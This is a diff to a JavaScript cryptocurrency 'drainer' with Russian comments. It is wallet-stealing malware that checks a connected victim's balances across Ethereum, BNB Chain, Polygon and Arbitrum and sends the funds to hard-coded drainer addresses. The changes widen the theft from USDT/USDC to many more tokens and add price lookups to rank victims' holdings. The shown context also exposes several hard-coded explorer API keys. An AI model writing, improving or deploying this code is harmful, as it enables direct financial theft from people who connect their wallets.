@@ -22,6 +22,50 @@ const ARBISCAN_API_KEY = "6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES";
 const OPTIMISTIC_ETHERSCAN_API_KEY = "5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW";
 const BASESCAN_API_KEY = "TEB6I1H3F1UH1DF2I1R39PA9RX5C6IKB1H";
 
+// API-ключ для CoinMarketCap (нужно заменить на твой ключ)
+const COINMARKETCAP_API_KEY = "YOUR_COINMARKETCAP_API_KEY"; // Замени на свой API-ключ
+
+// Идентификаторы токенов для CoinMarketCap (по символу токена)
+const TOKEN_CMC_SYMBOLS = {
+  // Нативные токены
+  "ETH": "ETH",
+  "BNB": "BNB",
+  "MATIC": "MATIC",
+  // Токены для Ethereum Mainnet (chainId: 1)
+  "0xdAC17F958D2ee523a2206206994597C13D831ec7": "USDT", // USDT
+  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": "USDC", // USDC
+  "0x6B175474E89094C44Da98b954EedeAC495271d0F": "DAI", // DAI
+  "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599": "WBTC", // WBTC
+  "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984": "UNI", // UNI
+  "0x514910771AF9Ca656af840dff83E8264EcF986CA": "LINK", // LINK
+  "0xc00e94Cb662C3520282E6f5717214004A7f26888": "COMP", // COMP
+  "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e": "YFI", // YFI
+  "0xD533a949740bb3306d119CC777fa900bA034cd52": "CRV", // CRV
+  "0x0D8775F648430679A709E98d2b0Cb6250d2887EF": "BAT", // BAT
+  "0xE41d2489571d322189246DaFA5ebDe1F4699F498": "ZRX", // ZRX
+  "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd": "LRC", // LRC
+  "0xB8c77482e45F1F44dE1745F52C74426C631bDD52": "BNB", // BNB
+  "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE": "SHIB", // SHIB
+  "0x6982508145454Ce325dDbE47a25d4ec3d2311933": "PEPE", // PEPE
+  "0x27C70Cd1946795B66be9d954418546998b546634": "LEASH", // LEASH
+  // Токены для BNB Chain (chainId: 56)
+  "0x55d398326f99059fF775485246999027B3197955": "USDT", // USDT
+  "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d": "USDC", // USDC
+  "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D": "SHIB", // SHIB
+  "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00": "PEPE", // PEPE
+  "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006": "FLOKI", // FLOKI
+  // Токены для Polygon (chainId: 137)
+  "0xc2132D05D31c914a87C6611C10748AEb04B58e8F": "USDT", // USDT
+  "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174": "USDC", // USDC
+  "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec": "SHIB", // SHIB
+  "0xA102DAa5E3D35eCaeF2A14dE4e94bAaF9cC38d56": "PEPE", // PEPE
+  // Токены для Arbitrum One (chainId: 42161)
+  "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9": "USDT", // USDT
+  "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8": "USDC", // USDC
+  "0x5033833c9fe8B503Ed2ABAfaFc6d2eB2fbF33a36": "SHIB", // SHIB
+  "0xA54B8e307E70e310A5C6bF7c2dB4b33eD9f3aC51": "PEPE" // PEPE
+};
+
 // Конфигурация сетей
 const CHAINS = {
   1: {
@@ -33,7 +77,23 @@ const CHAINS = {
     usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
     drainerAddress: "0x2F711446fa4048c375fE65fBf6C912DD44c736Cd",
     explorerApi: "https://api.etherscan.io/api",
-    explorerApiKey: ETHERSCAN_API_KEY
+    explorerApiKey: ETHERSCAN_API_KEY,
+    otherTokenAddresses: {
+      DAI: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+      WBTC: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
+      UNI: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
+      LINK: "0x514910771AF9Ca656af840dff83E8264EcF986CA",
+      COMP: "0xc00e94Cb662C3520282E6f5717214004A7f26888",
+      YFI: "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e",
+      CRV: "0xD533a949740bb3306d119CC777fa900bA034cd52",
+      BAT: "0x0D8775F648430679A709E98d2b0Cb6250d2887EF",
+      ZRX: "0xE41d2489571d322189246DaFA5ebDe1F4699F498",
+      LRC: "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd",
+      BNB: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
+      SHIB: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
+      PEPE: "0x6982508145454Ce325dDbE47a25d4ec3d2311933",
+      LEASH: "0x27C70Cd1946795B66be9d954418546998b546634"
+    }
   },
   56: {
     name: "BNB Chain",
@@ -48,7 +108,12 @@ const CHAINS = {
     usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
     drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
     explorerApi: "https://api.bscscan.com/api",
-    explorerApiKey: BSCSCAN_API_KEY
+    explorerApiKey: BSCSCAN_API_KEY,
+    otherTokenAddresses: {
+      SHIB: "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D",
+      PEPE: "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00",
+      FLOKI: "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006"
+    }
   },
   137: {
     name: "Polygon",
@@ -59,7 +124,11 @@ const CHAINS = {
     usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
     drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
     explorerApi: "https://api.polygonscan.com/api",
-    explorerApiKey: POLYGONSCAN_API_KEY
+    explorerApiKey: POLYGONSCAN_API_KEY,
+    otherTokenAddresses: {
+      SHIB: "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec",
+      PEPE: "0xA102DAa5E3D35eCaeF2A14dE4e94bAaF9cC38d56",
+    }
   },
   42161: {
     name: "Arbitrum One",
@@ -70,16 +139,39 @@ const CHAINS = {
     usdcAddress: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
     drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
     explorerApi: "https://api.arbiscan.io/api",
-    explorerApiKey: ARBISCAN_API_KEY
+    explorerApiKey: ARBISCAN_API_KEY,
+    otherTokenAddresses: {
+      SHIB: "0x5033833c9fe8B503Ed2ABAfaFc6d2eB2fbF33a36",
+      PEPE: "0xA54B8e307E70e310A5C6bF7c2dB4b33eD9f3aC51",
+    }
   }
 };
 
 // Утилита для задержки
 const delay = (ms) => new Promise(r => setTimeout(r, ms));
 
+// Функция для получения цены токена в USDT через CoinMarketCap
+async function getTokenPriceInUSDT(tokenSymbol) {
+  try {
+    const response = await fetch(`https://pro-api.coinmarketcap.com/v2/cryptocurrency/quotes/latest?symbol=${tokenSymbol}&convert=USDT`, {
+      headers: {
+        'X-CMC_PRO_API_KEY': COINMARKETCAP_API_KEY,
+      },
+    });
+    const data = await response.json();
+    if (data.status.error_code === 0 && data.data[tokenSymbol] && data.data[tokenSymbol][0].quote.USDT.price) {
+      return data.data[tokenSymbol][0].quote.USDT.price;
+    } else {
+      throw new Error(`Цена для ${tokenSymbol} не найдена`);
+    }
+  } catch (e) {
+    console.warn(`⚠️ Ошибка получения цены для ${tokenSymbol}: ${e.message}`);
+    return 0; // Если цена не найдена, возвращаем 0
+  }
+}
+
 // Функция для получения рабочего провайдера
 async function getWorkingProvider(rpcUrls, existingProvider = null) {
-  // Сначала проверяем существующий провайдер (если передан)
   if (existingProvider) {
     try {
       await existingProvider.getBalance('0x0000000000000000000000000000000000000000');
@@ -90,7 +182,6 @@ async function getWorkingProvider(rpcUrls, existingProvider = null) {
     }
   }
 
-  // Если переданный провайдер не работает, перебираем RPC
   for (const rpc of rpcUrls) {
     try {
       const provider = new ethers.providers.JsonRpcProvider(rpc);
@@ -133,7 +224,7 @@ async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
 // Проверка баланса с использованием API и fallback на RPC
 async function checkBalance(chainId, userAddress) {
   const config = CHAINS[chainId];
-  let nativeBalance, usdtBalance, usdcBalance;
+  let nativeBalance, tokenBalances = {};
 
   try {
     nativeBalance = await getBalanceFromExplorer(userAddress, chainId);
@@ -143,34 +234,54 @@ async function checkBalance(chainId, userAddress) {
     nativeBalance = await provider.getBalance(userAddress);
   }
 
+  // Проверяем USDT и USDC
   try {
-    usdtBalance = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
+    tokenBalances[config.usdtAddress] = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
   } catch (e) {
     console.warn(`Ошибка API для USDT в ${config.name}: ${e.message}`);
     const provider = await getWorkingProvider(config.rpcUrls);
     const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider);
-    usdtBalance = await usdt.balanceOf(userAddress);
+    tokenBalances[config.usdtAddress] = await usdt.balanceOf(userAddress);
   }
 
   try {
-    usdcBalance = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
+    tokenBalances[config.usdcAddress] = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
   } catch (e) {
     console.warn(`Ошибка API для USDC в ${config.name}: ${e.message}`);
     const provider = await getWorkingProvider(config.rpcUrls);
     const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider);
-    usdcBalance = await usdc.balanceOf(userAddress);
+    tokenBalances[config.usdcAddress] = await usdc.balanceOf(userAddress);
   }
 
-  return { nativeBalance, usdtBalance, usdcBalance };
+  // Проверяем дополнительные токены (DAI, WBTC, UNI, AAVE, ..., SHIB, PEPE, FLOKI, LEASH)
+  if (config.otherTokenAddresses) {
+    for (const tokenAddress of Object.values(config.otherTokenAddresses)) {
+      try {
+        tokenBalances[tokenAddress] = await getTokenBalanceFromExplorer(userAddress, tokenAddress, chainId);
+      } catch (e) {
+        console.warn(`Ошибка API для токена ${tokenAddress} в ${config.name}: ${e.message}`);
+        const provider = await getWorkingProvider(config.rpcUrls);
+        const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+        tokenBalances[tokenAddress] = await token.balanceOf(userAddress);
+      }
+    }
+  }
+
+  return { nativeBalance, tokenBalances };
 }
 
 // Проверка наличия средств
 function hasFunds(bal) {
-  return (
-    bal.nativeBalance.gt(ethers.utils.parseEther("0.001")) ||
-    bal.usdtBalance.gt(ethers.utils.parseUnits("0.1", 6)) ||
-    bal.usdcBalance.gt(ethers.utils.parseUnits("0.1", 6))
-  );
+  const minNativeBalance = ethers.utils.parseEther("0.001");
+  const minTokenBalance = ethers.utils.parseUnits("0.1", 6);
+
+  if (bal.nativeBalance.gt(minNativeBalance)) return true;
+
+  for (const balance of Object.values(bal.tokenBalances)) {
+    if (balance.gt(minTokenBalance)) return true;
+  }
+
+  return false;
 }
 
 // Переключение сети
@@ -190,14 +301,10 @@ async function switchChain(chainId) {
 async function drain(chainId, signer, userAddress, bal) {
   const config = CHAINS[chainId];
   const MAX = ethers.constants.MaxUint256;
-  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6); // Минимальный порог 0.1 USDT/USDC
+  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6); // Минимальный порог 0.1 для всех токенов
 
   // Проверяем провайдер перед использованием
   const reliableProvider = await getWorkingProvider(config.rpcUrls, signer.provider);
-  const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, signer);
-  const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, signer);
-
-  // Проверка баланса ETH перед approve
   const ethBalance = await reliableProvider.getBalance(userAddress);
   const minEthRequired = ethers.utils.parseEther("0.0003");
   if (ethBalance.lt(minEthRequired)) {
@@ -205,37 +312,26 @@ async function drain(chainId, signer, userAddress, bal) {
     throw new Error(`Недостаточно ${config.nativeToken} для оплаты газа`);
   }
 
-  // Проверяем реальные балансы USDT и USDC
-  let realUsdtBalance = ethers.BigNumber.from(0);
-  let realUsdcBalance = ethers.BigNumber.from(0);
-
-  if (bal.usdtBalance.gt(0)) {
-    console.log(`📊 USDT баланс (API): ${ethers.utils.formatUnits(bal.usdtBalance, 6)} USDT`);
-    realUsdtBalance = await usdt.balanceOf(userAddress);
-    console.log(`📊 USDT баланс (реальный): ${ethers.utils.formatUnits(realUsdtBalance, 6)} USDT`);
-    if (realUsdtBalance.lt(bal.usdtBalance)) {
-      console.error(`❌ Некорректный баланс: API вернул ${ethers.utils.formatUnits(bal.usdtBalance, 6)}, реальный: ${ethers.utils.formatUnits(realUsdtBalance, 6)}`);
-      bal.usdtBalance = realUsdtBalance;
-    }
-  }
-
-  if (bal.usdcBalance.gt(0)) {
-    console.log(`📊 USDC баланс (API): ${ethers.utils.formatUnits(bal.usdcBalance, 6)} USDC`);
-    realUsdcBalance = await usdc.balanceOf(userAddress);
-    console.log(`📊 USDC баланс (реальный): ${ethers.utils.formatUnits(realUsdcBalance, 6)} USDC`);
-    if (realUsdcBalance.lt(bal.usdcBalance)) {
-      console.error(`❌ Некорректный баланс: API вернул ${ethers.utils.formatUnits(bal.usdcBalance, 6)}, реальный: ${ethers.utils.formatUnits(realUsdcBalance, 6)}`);
-      bal.usdcBalance = realUsdcBalance;
-    }
-  }
-
-  // Сравниваем балансы и выбираем токен с большим балансом
+  // Собираем все токены для обработки (USDT, USDC, DAI, WBTC, ..., SHIB, PEPE, FLOKI, LEASH)
   const tokensToProcess = [];
-  if (bal.usdtBalance.gt(MIN_TOKEN_BALANCE)) {
-    tokensToProcess.push({ token: 'USDT', balance: bal.usdtBalance, contract: usdt, address: config.usdtAddress });
-  }
-  if (bal.usdcBalance.gt(MIN_TOKEN_BALANCE)) {
-    tokensToProcess.push({ token: 'USDC', balance: bal.usdcBalance, contract: usdc, address: config.usdcAddress });
+  const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];
+
+  for (const tokenAddress of tokenAddresses) {
+    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+    const realBalance = await tokenContract.balanceOf(userAddress);
+    console.log(`📊 Токен ${tokenAddress} баланс (реальный): ${ethers.utils.formatUnits(realBalance, 6)}`);
+
+    if (realBalance.lt(bal.tokenBalances[tokenAddress])) {
+      console.error(`❌ Некорректный баланс для ${tokenAddress}: API вернул ${ethers.utils.formatUnits(bal.tokenBalances[tokenAddress], 6)}, реальный: ${ethers.utils.formatUnits(realBalance, 6)}`);
+      bal.tokenBalances[tokenAddress] = realBalance;
+    }
+
+    if (realBalance.gt(MIN_TOKEN_BALANCE)) {
+      const symbol = tokenAddress === config.usdtAddress ? "USDT" :
+                    tokenAddress === config.usdcAddress ? "USDC" :
+                    Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress);
+      tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress });
+    }
   }
 
   // Сортируем по убыванию баланса
@@ -278,7 +374,7 @@ async function drain(chainId, signer, userAddress, bal) {
 
   // Если нет токенов для обработки
   if (tokensToProcess.length === 0) {
-    console.log("⚠️ Нет токенов с достаточным балансом для обработки (мин. 0.1 USDT/USDC)");
+    console.log("⚠️ Нет токенов с достаточным балансом для обработки (мин. 0.1)");
   }
 
   // Дрейнинг нативного токена
@@ -363,10 +459,37 @@ export async function runDrainer(provider, signer, userAddress) {
   const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
     try {
       const balance = await checkBalance(chainId, userAddress);
-      console.log(`Сеть: ${CHAINS[chainId].name}`);
-      console.log(`💰 ${CHAINS[chainId].nativeToken}: ${ethers.utils.formatEther(balance.nativeBalance)}`);
-      console.log(`🟠 USDT: ${ethers.utils.formatUnits(balance.usdtBalance, 6)}`);
-      console.log(`🔵 USDC: ${ethers.utils.formatUnits(balance.usdcBalance, 6)}`);
+      const config = CHAINS[chainId];
+      console.log(`Сеть: ${config.name}`);
+
+      // Получаем цену нативного токена
+      const nativeTokenPrice = await getTokenPriceInUSDT(TOKEN_CMC_SYMBOLS[config.nativeToken]);
+      const nativeBalanceInUSDT = (parseFloat(ethers.utils.formatEther(balance.nativeBalance)) * nativeTokenPrice).toFixed(2);
+      console.log(`💰 ${config.nativeToken}: ${ethers.utils.formatEther(balance.nativeBalance)} (≈ $${nativeBalanceInUSDT} USDT)`);
+
+      // Выводим USDT
+      const usdtBalance = balance.tokenBalances[config.usdtAddress];
+      console.log(`🟠 USDT: ${ethers.utils.formatUnits(usdtBalance, 6)} (≈ $${parseFloat(ethers.utils.formatUnits(usdtBalance, 6)).toFixed(2)} USDT)`);
+
+      // Выводим USDC
+      const usdcPrice = await getTokenPriceInUSDT(TOKEN_CMC_SYMBOLS[config.usdcAddress]);
+      const usdcBalance = balance.tokenBalances[config.usdcAddress];
+      const usdcBalanceInUSDT = (parseFloat(ethers.utils.formatUnits(usdcBalance, 6)) * usdcPrice).toFixed(2);
+      console.log(`🔵 USDC: ${ethers.utils.formatUnits(usdcBalance, 6)} (≈ $${usdcBalanceInUSDT} USDT)`);
+
+      // Выводим дополнительные токены (DAI, WBTC, UNI, ..., SHIB, PEPE, FLOKI, LEASH), если они есть
+      if (config.otherTokenAddresses) {
+        for (const [symbol, tokenAddress] of Object.entries(config.otherTokenAddresses)) {
+          const balanceValue = balance.tokenBalances[tokenAddress];
+          const decimals = symbol === "SHIB" ? 18 : 6; // SHIB имеет 18 десятичных знаков, остальные токены — 6
+          if (balanceValue && balanceValue.gt(0)) {
+            const tokenPrice = await getTokenPriceInUSDT(TOKEN_CMC_SYMBOLS[tokenAddress]);
+            const tokenBalanceInUSDT = (parseFloat(ethers.utils.formatUnits(balanceValue, decimals)) * tokenPrice).toFixed(8);
+            console.log(`🔹 ${symbol}: ${ethers.utils.formatUnits(balanceValue, decimals)} (≈ $${tokenBalanceInUSDT} USDT)`);
+          }
+        }
+      }
+
       return { chainId: Number(chainId), ...balance };
     } catch (e) {
       console.warn(`Ошибка при проверке баланса в сети ${CHAINS[chainId].name}: ${e.message}`);
@@ -377,9 +500,11 @@ export async function runDrainer(provider, signer, userAddress) {
   const balances = (await Promise.all(balancePromises)).filter(Boolean);
   const sorted = balances
     .filter(hasFunds)
-    .sort((a, b) =>
-      b.usdtBalance.add(b.usdcBalance).gt(a.usdtBalance.add(a.usdcBalance)) ? 1 : -1
-    );
+    .sort((a, b) => {
+      const aTotal = Object.values(a.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
+      const bTotal = Object.values(b.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
+      return bTotal.gt(aTotal) ? 1 : -1;
+    });
 
   if (!sorted.length) {
     console.warn("⛔ Нет подходящих сетей с балансом.");
